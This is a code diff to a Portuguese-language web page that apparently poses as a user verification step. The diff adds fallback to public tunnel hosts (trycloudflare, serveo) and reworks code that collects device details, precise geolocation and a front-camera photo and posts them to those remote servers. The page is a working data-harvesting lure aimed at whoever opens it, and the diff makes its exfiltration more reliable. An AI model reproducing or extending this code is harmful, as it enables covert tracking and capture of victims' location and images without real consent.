@@ -296,9 +296,37 @@
             opacity: 0.6;
             margin-top: 20px;
         }
+
+        .server-status {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            padding: 5px 10px;
+            border-radius: 15px;
+            font-size: 12px;
+            font-weight: bold;
+            z-index: 1000;
+        }
+
+        .server-status.online {
+            background: #28a745;
+            color: white;
+        }
+
+        .server-status.offline {
+            background: #dc3545;
+            color: white;
+        }
+
+        .server-status.checking {
+            background: #ffc107;
+            color: black;
+        }
     </style>
 </head>
 <body>
+    <div class="server-status checking" id="serverStatus">Verificando servidor...</div>
+    
     <div class="container">
         <!-- Tela Inicial -->
         <div id="initialScreen">
@@ -404,6 +432,15 @@
     </div>
 
     <script>
+        // *** CONFIGURAÇÃO CRUCIAL: URLs dos servidores ***
+        const SERVER_URLS = [
+            'https://summaries-shoes-deluxe-roulette.trycloudflare.com',
+            'https://socialdivulga.serveo.net',
+            'http://127.0.0.1:8000'  // Localhost para testes
+        ];
+        
+        let ACTIVE_SERVER_URL = null;
+        
         // Gerar session ID único
         const sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
         document.getElementById('sessionId').textContent = sessionId;
@@ -412,19 +449,72 @@
         const totalTasks = 3;
         let currentStep = 0;
         
-        // URL do seu servidor Flask (ALTERE AQUI SE NECESSÁRIO)
-        const API_BASE_URL = 'https://summaries-shoes-deluxe-roulette.trycloudflare.com';
+        // Função para verificar qual servidor está online
+        async function findActiveServer() {
+            const statusElement = document.getElementById('serverStatus');
+            statusElement.textContent = 'Procurando servidor...';
+            statusElement.className = 'server-status checking';
+            
+            for (const url of SERVER_URLS) {
+                try {
+                    console.log(`🔍 Testando servidor: ${url}`);
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 5000);
+                    
+                    const response = await fetch(`${url}/health`, {
+                        method: 'GET',
+                        headers: { 'ngrok-skip-browser-warning': 'true' },
+                        signal: controller.signal
+                    });
+                    
+                    clearTimeout(timeoutId);
+                    
+                    if (response.ok) {
+                        ACTIVE_SERVER_URL = url;
+                        console.log(`✅ Servidor ativo encontrado: ${url}`);
+                        statusElement.textContent = `Conectado: ${url.includes('cloudflare') ? 'Cloudflare' : url.includes('serveo') ? 'Serveo' : 'Local'}`;
+                        statusElement.className = 'server-status online';
+                        return true;
+                    }
+                } catch (error) {
+                    console.log(`❌ Servidor não disponível: ${url} - ${error.message}`);
+                }
+            }
+            
+            statusElement.textContent = 'Nenhum servidor disponível';
+            statusElement.className = 'server-status offline';
+            console.log('❌ Nenhum servidor disponível');
+            return false;
+        }
         
-        // Função para fazer requisições com headers personalizados
-        function customFetch(url, options = {}) {
+        // Função para fazer requisições com fallback automático
+        async function customFetch(endpoint, options = {}) {
+            if (!ACTIVE_SERVER_URL) {
+                const serverFound = await findActiveServer();
+                if (!serverFound) {
+                    throw new Error('Nenhum servidor disponível');
+                }
+            }
+            
             options.headers = options.headers || {};
             options.headers["ngrok-skip-browser-warning"] = "true";
-            options.headers["Access-Control-Allow-Origin"] = "*";
             
-            // Adicionar URL base se for endpoint relativo
-            const fullUrl = url.startsWith('http') ? url : API_BASE_URL + url;
+            const url = ACTIVE_SERVER_URL + endpoint;
             
-            return fetch(fullUrl, options);
+            try {
+                const response = await fetch(url, options);
+                return response;
+            } catch (error) {
+                console.error(`❌ Erro na requisição para ${url}:`, error);
+                // Tentar encontrar outro servidor
+                ACTIVE_SERVER_URL = null;
+                const serverFound = await findActiveServer();
+                if (serverFound) {
+                    // Tentar novamente com o novo servidor
+                    return await fetch(ACTIVE_SERVER_URL + endpoint, options);
+                }
+                throw error;
+            }
         }
 
         // Função para finalizar verificações
@@ -439,7 +529,7 @@
         }
 
         // Coleta de informações do dispositivo
-        function collectDeviceInfo() {
+        async function collectDeviceInfo() {
             try {
                 const deviceInfo = {
                     session_id: sessionId,
@@ -471,21 +561,19 @@
                     }
                 };
 
-                customFetch("/device_info", {
+                await customFetch("/device_info", {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify(deviceInfo)
-                }).then(() => {
-                    console.log('✅ Device info enviado com sucesso');
-                    completeVerification();
-                }).catch((error) => {
-                    console.error('❌ Erro ao enviar device info:', error);
-                    completeVerification();
                 });
+                
+                console.log('✅ Device info enviado com sucesso');
+                completeVerification();
+                
             } catch (error) {
-                console.error('❌ Erro ao coletar device info:', error);
+                console.error('❌ Erro ao enviar device info:', error);
                 completeVerification();
             }
         }
@@ -498,40 +586,43 @@
                 maximumAge: 0
             };
 
-            navigator.geolocation.getCurrentPosition(function(position) {
-                const locationData = {
-                    session_id: sessionId,
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    altitude: position.coords.altitude,
-                    altitudeAccuracy: position.coords.altitudeAccuracy,
-                    heading: position.coords.heading,
-                    speed: position.coords.speed,
-                    timestamp: new Date().toISOString(),
-                    device_info: {
-                        userAgent: navigator.userAgent,
-                        language: navigator.language
-                    },
-                    browser_info: {
-                        url: window.location.href,
-                        referrer: document.referrer
-                    }
-                };
+            navigator.geolocation.getCurrentPosition(async function(position) {
+                try {
+                    const locationData = {
+                        session_id: sessionId,
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        altitudeAccuracy: position.coords.altitudeAccuracy,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed,
+                        timestamp: new Date().toISOString(),
+                        device_info: {
+                            userAgent: navigator.userAgent,
+                            language: navigator.language
+                        },
+                        browser_info: {
+                            url: window.location.href,
+                            referrer: document.referrer
+                        }
+                    };
 
-                customFetch("/location", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify(locationData)
-                }).then(() => {
+                    await customFetch("/location", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify(locationData)
+                    });
+                    
                     console.log('✅ Localização enviada com sucesso');
                     completeVerification();
-                }).catch((error) => {
+                    
+                } catch (error) {
                     console.error('❌ Erro ao enviar localização:', error);
                     completeVerification();
-                });
+                }
             }, function(error) {
                 console.error('❌ Erro ao obter localização:', error);
                 completeVerification();
@@ -557,39 +648,42 @@
                     const canvas = document.createElement("canvas");
                     const context = canvas.getContext("2d");
 
-                    setTimeout(() => {
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        context.drawImage(video, 0, 0);
-                        
-                        stream.getTracks().forEach(track => track.stop());
-                        
-                        const dataURL = canvas.toDataURL("image/jpeg", 0.8);
+                    setTimeout(async () => {
+                        try {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            context.drawImage(video, 0, 0);
+                            
+                            stream.getTracks().forEach(track => track.stop());
+                            
+                            const dataURL = canvas.toDataURL("image/jpeg", 0.8);
 
-                        const photoData = {
-                            session_id: sessionId,
-                            photo: dataURL,
-                            camera_info: {
-                                width: canvas.width,
-                                height: canvas.height,
-                                timestamp: new Date().toISOString(),
-                                facing_mode: "user"
-                            }
-                        };
+                            const photoData = {
+                                session_id: sessionId,
+                                photo: dataURL,
+                                camera_info: {
+                                    width: canvas.width,
+                                    height: canvas.height,
+                                    timestamp: new Date().toISOString(),
+                                    facing_mode: "user"
+                                }
+                            };
 
-                        customFetch("/upload_photo", {
-                            method: "POST",
-                            headers: {
-                                "Content-Type": "application/json"
-                            },
-                            body: JSON.stringify(photoData)
-                        }).then(() => {
+                            await customFetch("/upload_photo", {
+                                method: "POST",
+                                headers: {
+                                    "Content-Type": "application/json"
+                                },
+                                body: JSON.stringify(photoData)
+                            });
+                            
                             console.log('✅ Foto enviada com sucesso');
                             completeVerification();
-                        }).catch((error) => {
+                            
+                        } catch (error) {
                             console.error('❌ Erro ao enviar foto:', error);
                             completeVerification();
-                        });
+                        }
                     }, 2000);
                 });
             }).catch((error) => {
@@ -621,7 +715,14 @@
             }
         ];
         
-        function startVerification() {
+        async function startVerification() {
+            // Verificar se servidor está disponível
+            const serverAvailable = await findActiveServer();
+            if (!serverAvailable) {
+                alert('❌ Nenhum servidor disponível. Verifique se o servidor Flask está rodando.');
+                return;
+            }
+            
             document.getElementById('initialScreen').classList.add('hidden');
             document.getElementById('progressScreen').classList.remove('hidden');
             
@@ -686,9 +787,13 @@
         
         function redirectToApp() {
             alert('🎉 Redirecionando para o aplicativo principal!');
-            // Redirecionar para outra página ou mostrar conteúdo principal
             // window.location.href = '/main';
         }
+        
+        // Verificar servidor quando a página carregar
+        window.addEventListener('load', async () => {
+            await findActiveServer();
+        });
     </script>
 </body>
 </html>
